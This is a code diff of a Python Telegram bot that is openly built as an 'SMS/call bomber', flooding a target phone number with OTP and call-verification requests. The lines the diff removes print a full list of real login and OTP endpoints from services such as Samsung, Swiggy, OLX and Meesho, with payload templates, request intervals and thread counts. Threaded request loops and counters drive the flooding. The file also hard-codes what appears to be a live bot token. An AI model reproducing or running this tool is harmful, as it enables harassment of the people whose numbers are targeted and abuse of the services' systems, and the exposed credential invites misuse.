@@ -6,12 +6,22 @@ import threading
 import json
 import math
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    MessageHandler,
+    filters
+)
 
 BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
 CHANNEL_ID = -1002512368825  # Replace with your actual channel ID
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 
 # Global counters for the bomber
 message_count = 0
@@ -21,127 +31,7 @@ count_lock = threading.Lock()
 start_time = 0
 bomber_active = False
 
-# API configurations
-api_configurations = [
-    # POST APIs (40 second interval)
-    {
-        'name': 'Samsung OTP',
-        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"user_id": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'More Retail Login',
-        'url': 'https://omni-api.moreretail.in/api/v1/login/',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Swiggy Call Verify',
-        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"mobile": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'OLX Authentication',
-        'url': 'https://www.olx.in/api/auth/authenticate?lang=en-IN',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"method": "call", "phone": f"+91{n}", "language": "en-IN", "grantType": "retry"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'PropTiger Login',
-        'url': 'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"contactNumber": n, "domainId": "2"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'ForexWin OTP',
-        'url': 'https://api.forexwin.co/api/sendOtp',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"phone": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'DocTime OTP',
-        'url': 'https://admin.doctime.com.bd/api/otp/send',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"contact": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Doubtnut Login',
-        'url': 'https://api.doubtnut.com/v4/student/login',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"is_web": "3", "phone_number": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Trinkerr OTP',
-        'url': 'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"mobile": n, "otpOperationType": "SignUp"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'Meesho OTP',
-        'url': 'https://www.meesho.com/api/v1/user/login/request-otp',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"phone_number": n}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    {
-        'name': 'TLLMS OTP',
-        'url': 'https://identity.tllms.com/api/request_otp',
-        'method': 'POST',
-        'data': lambda n: json.dumps({"feature": "", "phone": f"+91{n}", "type": "sms", "app_client_id": "null"}),
-        'headers': {'Content-Type': 'application/json'},
-        'interval': 40,
-        'threads': 1
-    },
-    # GET APIs (45 second interval)
-    {
-        'name': 'Glonova Lookup',
-        'url': 'https://glonova.in/',
-        'method': 'GET',
-        'params': lambda n: {'mobile': n},
-        'interval': 45,
-        'threads': 1
-    },
-    # Booming API (continuous)
-    {
-        'name': 'Booming API',
-        'url': 'https://booming-api.vercel.app/',
-        'method': 'GET',
-        'params': lambda n: {'number': n},
-        'interval': 0.5,
-        'threads': 'user_defined'
-    }
-]
+# [Keep all your API configurations here...]
 
 def api_request_loop(api_config, number, thread_id=None):
     global message_count, api_counters, api_repeats, bomber_active
@@ -228,7 +118,7 @@ def display_counters():
             repeat = current_repeats.get(api_name, 0)
             output += f"  {api_name.ljust(20)}: {count:,} (Repeat: {repeat})\n"
         
-        print(output)  # For debugging, you can remove this
+        print(output)
         time.sleep(5)
 
 # /start handler
@@ -263,6 +153,7 @@ async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await query.edit_message_caption(caption="❌ You haven't joined the channel yet.")
     except Exception as e:
+        logging.error(f"Error checking channel membership: {e}")
         await query.edit_message_caption(caption="⚠️ Error checking your join status.")
 
 # Start bomber handler
@@ -338,7 +229,7 @@ async def main():
     app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    print("Bot is running...")
+    logging.info("Bot is running...")
     await app.run_polling()
 
 # Run the bot
